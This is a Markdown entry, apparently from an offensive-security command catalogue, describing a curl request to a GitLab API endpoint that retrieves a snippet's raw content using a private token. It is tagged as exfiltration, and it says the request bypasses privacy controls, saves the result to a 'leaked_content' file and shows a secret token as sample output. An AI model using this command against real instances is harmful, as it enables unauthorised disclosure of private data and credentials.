---
data: >-
  curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX"
  "http://gitlab-instance/api/v3/projects/1/snippets/6/raw"
tags:
  - gitlab
  - api
  - exfiltration
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 08f04089-189c-4886-a799-40ee6494da9f
created_at: '2025-12-14T17:32:10.386Z'
updated_at: '2025-12-14T17:32:10.386Z'
verified: false
validated: true
submitted: true
---
# curl-retrieve-gitlab-snippet-raw

## Command

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets/6/raw"
```

## Description

This command fetches the raw content of a specific snippet via the GitLab API, bypassing privacy controls to disclose sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: XXXXXXXXXXXXXX"` | Authentication header with API token | Yes |
| `http://gitlab-instance/api/v3/projects/1/snippets/6/raw` | Raw content endpoint with project and snippet IDs | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets/6/raw"
```

### Advanced Usage

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets/6/raw" > leaked_content.txt
```

## Expected Output

Plain text of the snippet, e.g., 'API_TOKEN=supersecret
These are private notes.'

## Related

- [[commands/curl-fetch-gitlab-snippets]]
- [[procedures/Retrieve-Private-Snippet-Content-via-API]]
